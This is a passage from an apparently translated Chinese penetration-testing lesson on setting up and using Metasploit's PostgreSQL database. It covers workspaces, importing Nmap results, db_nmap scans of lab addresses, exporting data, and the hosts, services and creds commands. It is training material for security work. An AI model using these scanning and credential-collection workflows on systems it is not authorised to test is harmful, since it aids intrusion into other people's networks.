5u  IPv6  34336      0t0  TCP localhost:5432 (LISTEN)</span><br><span class="line">postgres 2458 postgres    6u  IPv4  34337      0t0  TCP localhost:5432 (LISTEN)</span><br><span class="line"></span><br><span class="line">UID          PID    PPID  C STIME TTY      STAT   TIME CMD</span><br><span class="line">postgres    2458       1  0 15:19 ?        Ss     0:00 /usr/lib/postgresql/13/bin/postgres -D /var/lib/postgresql/13/main -c con</span><br><span class="line"></span><br><span class="line">[+] Detected configuration file (/usr/share/metasploit-framework/config/database.yml)</span><br></pre></td></tr></table></figure><p>如果这个错误没有出现，这通常发生在全新安装 Metasploit 之后，那么我们将在初始化数据库时看到以下内容：</p><p> MSF - 启动数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb init</span><br><span class="line"></span><br><span class="line">[+] Starting database</span><br><span class="line">[+] Creating database user &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf_test&#x27;</span><br><span class="line">[+] Creating configuration file &#x27;/usr/share/metasploit-framework/config/database.yml&#x27;</span><br><span class="line">[+] Creating initial database schema</span><br></pre></td></tr></table></figure><p>数据库初始化完成后，我们可以<code>msfconsole</code>同时启动并连接到创建的数据库。</p><h4 id="MSF-连接到启动的数据库"><a href="#MSF-连接到启动的数据库" class="headerlink" title="MSF - 连接到启动的数据库"></a>MSF - 连接到启动的数据库</h4><p> MSF - 连接到启动的数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb run</span><br><span class="line"></span><br><span class="line">[i] Database already started</span><br><span class="line">                                                  </span><br><span class="line">         .                                         .</span><br><span class="line"> .</span><br><span class="line"></span><br><span class="line">      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o</span><br><span class="line">       &#x27;   dB&#x27;                     BBP</span><br><span class="line">    dB&#x27;dB&#x27;dB&#x27; dBBP     dBP     dBP BB</span><br><span class="line">   dB&#x27;dB&#x27;dB&#x27; dBP      dBP     dBP  BB</span><br><span class="line">  dB&#x27;dB&#x27;dB&#x27; dBBBBP   dBP     dBBBBBBB</span><br><span class="line"></span><br><span class="line">                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP</span><br><span class="line">          .                  .                  dB&#x27; dBP    dB&#x27;.BP</span><br><span class="line">                             |       dBP    dBBBB&#x27; dBP    dB&#x27;.BP dBP    dBP</span><br><span class="line">                           --o--    dBP    dBP    dBP    dB&#x27;.BP dBP    dBP</span><br><span class="line">                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP</span><br><span class="line"></span><br><span class="line">                                                                    .</span><br><span class="line">                .</span><br><span class="line">        o                  To boldly go where no</span><br><span class="line">                            shell has gone before</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.1.39-dev                          ]</span><br><span class="line">+ -- --=[ 2214 exploits - 1171 auxiliary - 396 post       ]</span><br><span class="line">+ -- --=[ 616 payloads - 45 encoders - 11 nops            ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf6&gt;</span><br></pre></td></tr></table></figure><p>但是，如果我们已经配置了数据库并且无法将密码更改为 MSF 用户名，请继续执行以下命令：</p><h4 id="MSF-重新启动数据库"><a href="#MSF-重新启动数据库" class="headerlink" title="MSF - 重新启动数据库"></a>MSF - 重新启动数据库</h4><p> MSF - 重新启动数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfdb reinit</span><br><span class="line">vnswer77@htb[/htb]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/</span><br><span class="line">vnswer77@htb[/htb]$ sudo service postgresql restart</span><br><span class="line">vnswer77@htb[/htb]$ msfconsole -q</span><br><span class="line"></span><br><span class="line">msf6 &gt; db_status</span><br><span class="line"></span><br><span class="line">[*] Connected to msf. Connection type: PostgreSQL.</span><br></pre></td></tr></table></figure><p>现在，我们可以开始了。它还<code>msfconsole</code>为数据库提供集成帮助。这为我们提供了与数据库交互和使用数据库的良好概述。</p><h4 id="MSF-数据库选项"><a href="#MSF-数据库选项" class="headerlink" title="MSF - 数据库选项"></a>MSF - 数据库选项</h4><p> MSF - 数据库选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; help database</span><br><span class="line"></span><br><span class="line">Database Backend Commands</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    db_connect        Connect to an existing database</span><br><span class="line">    db_disconnect     Disconnect from the current database instance</span><br><span class="line">    db_export         Export a file containing the contents of the database</span><br><span class="line">    db_import         Import a scan result file (filetype will be auto-detected)</span><br><span class="line">    db_nmap           Executes nmap and records the output automatically</span><br><span class="line">    db_rebuild_cache  Rebuilds the database-stored module cache</span><br><span class="line">    db_status         Show the current database status</span><br><span class="line">    hosts             List all hosts in the database</span><br><span class="line">    loot              List all loot in the database</span><br><span class="line">    notes             List all notes in the database</span><br><span class="line">    services          List all services in the database</span><br><span class="line">    vulns             List all vulnerabilities in the database</span><br><span class="line">    workspace         Switch between database workspaces</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; db_status</span><br><span class="line"></span><br><span class="line">[*] Connected to msf. Connection type: postgresql.</span><br></pre></td></tr></table></figure><hr><h2 id="使用数据库"><a href="#使用数据库" class="headerlink" title="使用数据库"></a>使用数据库</h2><p>在数据库的帮助下，我们可以管理我们分析过的许多不同的类别和主机。或者，我们使用 Metasploit 与之交互的有关它们的信息。这些数据库可以导出和导入。当我们有大量的主机列表、战利品、注释和这些主机的存储漏洞时，这尤其有用。确认数据库连接成功后，我们就可以组织我们的<code>Workspaces</code>.</p><h4 id="工作区"><a href="#工作区" class="headerlink" title="工作区"></a>工作区</h4><p>我们可以<code>Workspaces</code>像考虑项目中的文件夹一样考虑。我们可以按 IP、子网、网络或域隔离不同的扫描结果、主机和提取的信息。</p><p>要查看当前工作区列表，请使用<code>workspace</code>命令。在命令后添加<code>-a</code>or开关，后跟工作空间的名称，将把工作空间或该工作空间添加到数据库中。<code>-d``add``delete</code></p><p> 工作区</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; workspace</span><br><span class="line"></span><br><span class="line">* default</span><br></pre></td></tr></table></figure><p>请注意，默认工作区已<code>default</code>根据<code>*</code>符号命名并且当前正在使用中。键入<code>workspace [name]</code>命令以切换当前使用的工作区。回顾我们的示例，让我们为此评估创建一个工作区并选择它。</p><p> 工作区</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; workspace -a Target_1</span><br><span class="line"></span><br><span class="line">[*] Added workspace: Target_1</span><br><span class="line">[*] Workspace: Target_1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; workspace Target_1 </span><br><span class="line"></span><br><span class="line">[*] Workspace: Target_1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; workspace</span><br><span class="line"></span><br><span class="line">  default</span><br><span class="line">* Target_1</span><br></pre></td></tr></table></figure><p>要查看我们还可以使用 Workspaces 做什么，我们可以使用<code>workspace -h</code>与 Workspaces 相关的帮助菜单的命令。</p><p> 工作区</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; workspace -h</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">    workspace                  List workspaces</span><br><span class="line">    workspace -v               List workspaces verbosely</span><br><span class="line">    workspace [name]           Switch workspace</span><br><span class="line">    workspace -a [name] ...    Add workspace(s)</span><br><span class="line">    workspace -d [name] ...    Delete workspace(s)</span><br><span class="line">    workspace -D               Delete all workspaces</span><br><span class="line">    workspace -r     Rename workspace</span><br><span class="line">    workspace -h               Show this help information</span><br></pre></td></tr></table></figure><hr><h2 id="导入扫描结果"><a href="#导入扫描结果" class="headerlink" title="导入扫描结果"></a>导入扫描结果</h2><p>接下来，让我们假设我们想要将<code>Nmap scan</code>主机的一个导入到我们的数据库的工作区中，以便更好地了解目标。我们可以<code>db_import</code>为此使用命令。导入完成后，我们可以使用<code>hosts</code>和<code>services</code>命令检查数据库中主机信息的存在。请注意，<code>.xml</code>文件类型首选<code>db_import</code>.</p><h4 id="存储-Nmap-扫描"><a href="#存储-Nmap-扫描" class="headerlink" title="存储 Nmap 扫描"></a>存储 Nmap 扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ cat Target.nmap</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 20:54 UTC</span><br><span class="line">Nmap scan report for 10.10.10.40</span><br><span class="line">Host is up (0.017s latency).</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 60.81 seconds</span><br></pre></td></tr></table></figure><h4 id="导入扫描结果-1"><a href="#导入扫描结果-1" class="headerlink" title="导入扫描结果"></a>导入扫描结果</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_import Target.xml</span><br><span class="line"></span><br><span class="line">[*] Importing &#x27;Nmap XML&#x27; data</span><br><span class="line">[*] Import: Parsing with &#x27;Nokogiri v1.10.9&#x27;</span><br><span class="line">[*] Importing host 10.10.10.40</span><br><span class="line">[*] Successfully imported ~/Target.xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; hosts</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---  ----  -------  ---------  -----  -------  ----  --------</span><br><span class="line">10.10.10.40             Unknown                    device         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; services</span><br><span class="line"></span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">host         port   proto  name          state  info</span><br><span class="line">----         ----   -----  ----          -----  ----</span><br><span class="line">10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn</span><br><span class="line">10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP</span><br><span class="line">10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC</span><br></pre></td></tr></table></figure><h2 id="在-MSF-控制台中使用-Nmap"><a href="#在-MSF-控制台中使用-Nmap" class="headerlink" title="在 MSF 控制台中使用 Nmap"></a>在 MSF 控制台中使用 Nmap</h2><p>或者，我们可以直接从 msfconsole 使用 Nmap！要直接从控制台扫描而无需后台或退出进程，请使用命令<code>db_nmap</code>。</p><h4 id="无国界医生-Nmap"><a href="#无国界医生-Nmap" class="headerlink" title="无国界医生-Nmap"></a>无国界医生-Nmap</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_nmap -sV -sS 10.10.10.8</span><br><span class="line"></span><br><span class="line">[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 21:04 UTC</span><br><span class="line">[*] Nmap: Nmap scan report for 10.10.10.8</span><br><span class="line">[*] Nmap: Host is up (0.016s latency).</span><br><span class="line">[*] Nmap: Not shown: 999 filtered ports</span><br><span class="line">[*] Nmap: PORT   STATE SERVICE VERSION</span><br><span class="line">[*] Nmap: 80/TCP open  http    HttpFileServer httpd 2.3</span><br><span class="line">[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ </span><br><span class="line">[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; hosts</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---  ----  -------  ---------  -----  -------  ----  --------</span><br><span class="line">10.10.10.8              Unknown                    device         </span><br><span class="line">10.10.10.40             Unknown                    device         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; services</span><br><span class="line"></span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">host         port   proto  name          state  info</span><br><span class="line">----         ----   -----  ----          -----  ----</span><br><span class="line">10.10.10.8   80     tcp    http          open   HttpFileServer httpd 2.3</span><br><span class="line">10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn</span><br><span class="line">10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP</span><br><span class="line">10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC</span><br></pre></td></tr></table></figure><h2 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h2><p>会话结束后，如果 PostgreSQL 服务出现任何问题，请务必备份我们的数据。为此，请使用<code>db_export</code>命令。</p><h4 id="MSF-数据库导出"><a href="#MSF-数据库导出" class="headerlink" title="MSF - 数据库导出"></a>MSF - 数据库导出</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_export -h</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">    db_export -f &lt;format&gt; [filename]</span><br><span class="line">    Format can be one of: xml, pwdump</span><br><span class="line">[-] No output file was specified</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; db_export -f xml backup.xml</span><br><span class="line"></span><br><span class="line">[*] Starting export of workspace default to backup.xml [ xml ]...</span><br><span class="line">[*] Finished export of workspace default to backup.xml [ xml ]...</span><br></pre></td></tr></table></figure><p>以后需要时可以将此数据导回 msfconsole。<code>hosts</code>其他与数据保留相关的命令是、<code>services</code>、<code>creds</code>和命令的扩展使用<code>loot</code>。</p><h2 id="主持"><a href="#主持" class="headerlink" title="主持"></a>主持</h2><p>该<code>hosts</code>命令显示一个数据库表，该表自动填充了主机地址、主机名以及我们在扫描和交互过程中找到的有关这些信息的其他信息。例如，假设<code>msfconsole</code>与可以执行服务和操作系统检测的扫描仪插件链接。在这种情况下，一旦通过 msfconsole 完成扫描，该信息就会自动出现在表中。同样，Nessus、NexPose 或 Nmap 等工具将在这些情况下为我们提供帮助。</p><p>主机也可以手动添加为该表中的单独条目。添加我们的自定义主机后，我们还可以组织表格的格式和结构、添加评论、更改现有信息等等。</p><h4 id="MSF-存储主机"><a href="#MSF-存储主机" class="headerlink" title="MSF - 存储主机"></a>MSF - 存储主机</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; hosts -h</span><br><span class="line"></span><br><span class="line">Usage: hosts [ options ] [addr1 addr2 ...]</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">  -a,--add          Add the hosts instead of searching</span><br><span class="line">  -d,--delete       Delete the hosts instead of searching</span><br><span class="line">  -c &lt;col1,col2&gt;    Only show the given columns (see list below)</span><br><span class="line">  -C &lt;col1,col2&gt;    Only show the given columns until the next restart (see list below)</span><br><span class="line">  -h,--help         Show this help information</span><br><span class="line">  -u,--up           Only show hosts which are up</span><br><span class="line">  -o &lt;file&gt;         Send output to a file in CSV format</span><br><span class="line">  -O &lt;column&gt;       Order rows by specified column number</span><br><span class="line">  -R,--rhosts       Set RHOSTS from the results of the search</span><br><span class="line">  -S,--search       Search string to filter by</span><br><span class="line">  -i,--info         Change the info of a host</span><br><span class="line">  -n,--name         Change the name of a host</span><br><span class="line">  -m,--comment      Change the comment of a host</span><br><span class="line">  -t,--tag          Add or specify a tag to a range of hosts</span><br><span class="line"></span><br><span class="line">Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags</span><br></pre></td></tr></table></figure><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><p>该<code>services</code>命令的功能与前一个命令相同。它包含一个表格，其中包含有关在扫描或交互过程中发现的服务的描述和信息。与上面的命令一样，这里的条目是高度可定制的。</p><h4 id="MSF-主机的存储服务"><a href="#MSF-主机的存储服务" class="headerlink" title="MSF - 主机的存储服务"></a>MSF - 主机的存储服务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; services -h</span><br><span class="line"></span><br><span class="line">Usage: services [-h] [-u] [-a] [-r &lt;proto&gt;] [-p &lt;port1,port2&gt;] [-s &lt;name1,name2&gt;] [-o &lt;filename&gt;] [addr1 addr2 ...]</span><br><span class="line"></span><br><span class="line">  -a,--add          Add the services instead of searching</span><br><span class="line">  -d,--delete       Delete the services instead of searching</span><br><span class="line">  -c &lt;col1,col2&gt;    Only show the given columns</span><br><span class="line">  -h,--help         Show this help information</span><br><span class="line">  -s &lt;name&gt;         Name of the service to add</span><br><span class="line">  -p &lt;port&gt;         Search for a list of ports</span><br><span class="line">  -r &lt;protocol&gt;     Protocol type of the service being added [tcp|udp]</span><br><span class="line">  -u,--up           Only show services which are up</span><br><span class="line">  -o &lt;file&gt;         Send output to a file in csv format</span><br><span class="line">  -O &lt;column&gt;       Order rows by specified column number</span><br><span class="line">  -R,--rhosts       Set RHOSTS from the results of the search</span><br><span class="line">  -S,--search       Search string to filter by</span><br><span class="line">  -U,--update       Update data for existing service</span><br><span class="line"></span><br><span class="line">Available columns: created_at, info, name, port, proto, state, updated_at</span><br></pre></td></tr></table></figure><h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>该<code>creds</code>命令允许您可视化在与目标主机交互期间收集的凭据。我们还可以手动添加凭据，将现有凭据与端口规范匹配，添加描述等。</p><h4 id="MSF-存储凭证"><a href="#MSF-存储凭证" class="headerlink" title="MSF - 存储凭证"></a>MSF - 存储凭证</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; creds -h</span><br><span class="line"></span><br><span class="line">With no sub-command, list credentials. If an address range is</span><br><span class="line">given, show only credentials with logins on hosts within that</span><br><span class="line">range.</span><br><span class="line"></span><br><span class="line">Usage - Listing credentials:</span><br><span class="line">  creds [filter options] [address range]</span><br><span class="line"></span><br><span class="line">Usage - Adding credentials:</span><br><span class="line">  creds add uses the following named parameters.</span><br><span class="line">    user      :  Public, usually a username</span><br><span class="line">    password  :  Private, private_type Password.</span><br><span class="line">    ntlm      :  Private, private_type NTLM Hash.</span><br><span class="line">    Postgres  :  Private, private_type Postgres MD5</span><br><span class="line">    ssh-key   :  Private, private_type SSH key, must be a file path.</span><br><span class="line">    hash      :  Private, private_type Nonreplayable hash</span><br><span class="line">    jtr       :  Private, private_type John the Ripper hash type.</span><br><span class="line">    realm     :  Realm, </span><br><span class="line">    realm-type:  Realm, realm_type (domain db2db sid pgdb rsync wildcard), defaults to domain.</span><br><span class="line"></span><br><span class="line">Examples: Adding</span><br><span class="line">   # Add a user, password and realm</span><br><span class="line">   creds add user:admin password:notpassword realm:workgroup</span><br><span class="line">   # Add a user and password</span><br><span class="line">   creds add user:guest password:&#x27;guest password&#x27;</span><br><span class="line">   # Add a password</span><br><span class="line">   creds add password:&#x27;password without username&#x27;</span><br><span class="line">   # Add a user with an NTLMHash</span><br><span class="line">   creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A</span><br><span class="line">   # Add a NTLMHash</span><br><span class="line">   creds add ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A</span><br><span class="line">   # Add a Postgres MD5</span><br><span class="line">   creds add user:postgres postgres:md5be86a79bf2043622d58d5453c47d4860</span><br><span class="line">   # Add a user with an SSH key</span><br><span class="line">   creds add user:sshadmin 